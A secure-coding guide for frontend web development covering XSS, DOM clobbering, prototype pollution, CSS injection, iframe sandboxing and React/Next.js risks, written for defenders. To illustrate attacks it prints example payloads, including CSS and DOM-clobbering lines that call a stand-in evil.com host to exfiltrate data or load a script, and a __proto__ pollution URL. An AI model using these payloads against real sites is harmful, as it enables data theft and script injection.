# Frontend Security (HTML / CSS / JS)

## XSS Prevention

### Never insert untrusted data into HTML without sanitization

```javascript
// SAFE: textContent (auto-escapes)
element.textContent = userInput;

// SAFE: DOMPurify for rich HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// SAFE: DOMPurify with config
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOW_DATA_ATTR: false
});

// DANGEROUS:
element.innerHTML = userInput;
document.write(userInput);
element.outerHTML = userInput;
element.insertAdjacentHTML('beforeend', userInput);
```

### Escape by context

| Context | Method | Example |
|---------|--------|---------|
| HTML body | `textContent` or HTML-encode | `&lt;script&gt;` |
| HTML attribute | Quote + HTML-encode | `value="&quot;data&quot;"` |
| JavaScript string | JSON.stringify or JS-encode | `\x3cscript\x3e` |
| URL parameter | `encodeURIComponent()` | `%3Cscript%3E` |
| CSS value | Whitelist allowed values | Never insert user data |

### Sanitize URLs

```javascript
function isSafeUrl(url) {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}
// Apply before setting href, src, action, formaction
// Blocks javascript: protocol — <a href="javascript:alert(1)">
```

## DOM Safety

```javascript
// SAFE: createElement + textContent
const div = document.createElement('div');
div.textContent = userInput;
container.appendChild(div);

// DANGEROUS:
container.innerHTML = `<div>${userInput}</div>`; // XSS
eval(userInput); // RCE
new Function(userInput)(); // RCE
setTimeout(userInput, 0); // XSS if string
setInterval(userInput, 1000); // XSS if string
```

## Template Engines (Server-Side)

```javascript
// Handlebars: {{var}} = escaped (SAFE); {{{var}}} = raw (DANGEROUS with user data)

// Nunjucks — enable autoescape
nunjucks.configure('views', {
  autoescape: true,
  throwOnUndefined: true
});
// {{ var }} = escaped (SAFE); {{ var | safe }} = raw (DANGEROUS)

// EJS: <%= var %> = escaped (SAFE); <%- var %> = raw (DANGEROUS)
```

Rules:
- Always enable autoescape
- Never raw/unescaped output with user data
- Never render user-controlled templates (SSTI)
- Never pass user input to template file path (path traversal)

## postMessage Security

```javascript
// RECEIVING — always verify origin
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://trusted-domain.com') return;
  const data = event.data;
  if (typeof data?.action !== 'string') return; // validate structure before use
});

// SENDING — always specify target origin; never '*' with sensitive data
iframe.contentWindow.postMessage(data, 'https://target-domain.com');
```

## localStorage / sessionStorage

Never store: auth tokens (use httpOnly cookies), passwords/secrets, PII, session IDs.
OK: UI preferences, non-sensitive cache, CSRF tokens (second factor only, not sole protection).

```javascript
// Always validate data read from storage
const cached = localStorage.getItem('prefs');
try {
  const prefs = JSON.parse(cached);
  if (typeof prefs?.theme !== 'string') throw new Error();
  applyTheme(prefs.theme);
} catch {
  localStorage.removeItem('prefs');
}
```

## Form Security

```html
<form method="POST" action="/transfer">
  <input type="hidden" name="_csrf" value="{{csrfToken}}">
</form>

<input type="password" autocomplete="new-password">
<input type="text" name="credit-card" autocomplete="off">
```

Client-side validation = UX only; always validate server-side.

## Third-Party Scripts

```html
<!-- SRI on all CDN scripts/styles -->
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-HASH_HERE"
  crossorigin="anonymous"
></script>

<!-- Generate hash: openssl dgst -sha384 -binary lib.js | openssl base64 -A -->
```

Rules:
- Pin CDN URLs to specific versions (never `/latest/`)
- SRI on all external scripts and styles
- Self-host critical libraries
- Audit third-party scripts periodically
- Load analytics/tracking in sandboxed iframe or GTM with CSP

## iframe Security

```html
<!-- Anti-clickjacking: header X-Frame-Options: DENY, or CSP frame-ancestors 'none' -->

<iframe
  src="https://external.com/widget"
  sandbox="allow-scripts allow-same-origin"
  loading="lazy"
></iframe>
```

sandbox flags: `allow-scripts` (JS), `allow-same-origin` (cookie/storage), `allow-forms`, `allow-popups`.
Never combine `allow-scripts` + `allow-same-origin` for untrusted content.

## CSS Injection Prevention

Never insert user data into CSS: `background: url(USER_INPUT)` → exfil via `url(https://evil.com/?data=secret)`.
Attacks: data exfil via `background: url()`, UI redress via `position: absolute`, keystroke logging via `@font-face` unicode-range + scroll, warning hiding via `display: none`.
SAFE: CSS custom properties with sanitized values.

## DOM Clobbering

HTML elements with `id`/`name` become global JS properties — attacker injects script-free HTML (passes sanitizers) that overwrites variables. 55% of HTML sanitizers vulnerable by default (CISPA research).

```html
<!-- Attacker injects — passes sanitizer, no scripts! -->
<a id="config" href="https://evil.com/malicious.js"></a>
<script>
  // window.config is now the <a> element
  const src = window.config?.href || '/default.js';
  loadScript(src); // loads attacker's script
</script>
```

Chains: clobber `window.defaultConfig` → override app settings; double clobber `<form id="x"><input name="y">` → `x.y`; Webpack AutoPublicPathRuntimeModule gadget → XSS in bundled apps (2024, Canvas LMS).

Prevention:
```javascript
// const/let only — block-scoped, can't be clobbered
const config = { href: '/default.js' }; // not window.config

// Validate DOM-derived values
if (typeof config?.href !== 'string' || !config.href.startsWith('/')) {
  throw new Error('Invalid config');
}

// Freeze sensitive configs
const CONFIG = Object.freeze({ apiUrl: '/api', version: '1.0' });
```

## Client-Side Prototype Pollution

```javascript
// URL-based pollution (SPAs): https://app.com/#__proto__[isAdmin]=true
const params = new URLSearchParams(location.hash.slice(1));
const config = {};
for (const [key, value] of params) {
  deepSet(config, key, value); // Lodash _.set, jQuery $.extend, manual deep-set
  // key = "__proto__[isAdmin]" → Object.prototype.isAdmin = "true"
}
// EVERY object now has isAdmin === "true"

// Exploit chain → DOM XSS: pollute Object.prototype.innerHTML or .src
```

Prevention:
```javascript
// Block dangerous keys in all input parsing
function isSafeKey(key) {
  return !['__proto__', 'constructor', 'prototype'].includes(key);
}

// Map instead of plain objects for user-controlled keys
const userConfig = new Map();

// Object.create(null) for lookup tables
const lookup = Object.create(null);

// Nuclear option — may break libraries:
Object.freeze(Object.prototype);
```

## PortSwigger Top Techniques 2025 (frontend-relevant)

- Internal cache poisoning — malicious responses served globally
- Cross-Site ETag Length Leak — response size leak cross-domain via timing
- XS-Leaks / side channels — cross-origin data extraction
- SSTI polyglots — error-based detection
- SAML authentication bypass — XML signature wrapping
- Browser redirect stalling

## React / Next.js Security (2025-2026)

```javascript
// CVE-2025-55182 (React2Shell, CVSS 10.0): pre-auth RCE via React Server
// Components deserialization — single HTTP request → arbitrary code execution.
// Affects React 19.x with Server Components, Next.js 13-15.
// Fix: update to latest patched version.

// Server Actions ("use server") are public endpoints — callable directly
// with any arguments. Validate ALL input:
async function updateUser(formData) {
  // WRONG: trust formData
  await db.users.update({ data: Object.fromEntries(formData) });

  // RIGHT: validate + whitelist fields
  const name = z.string().max(100).parse(formData.get('name'));
  await db.users.update({ where: { id: session.userId }, data: { name } });
}
```

Rules:
- Server Components/Actions = public endpoints, validate everything
- `dangerouslySetInnerHTML` = same risk as `innerHTML`
- Middleware auth checks alone insufficient — verify in route handlers
- Keep React + Next.js on latest security patches (critical RCEs in 2025)
- URL-based routing: validate all `params` and `searchParams`
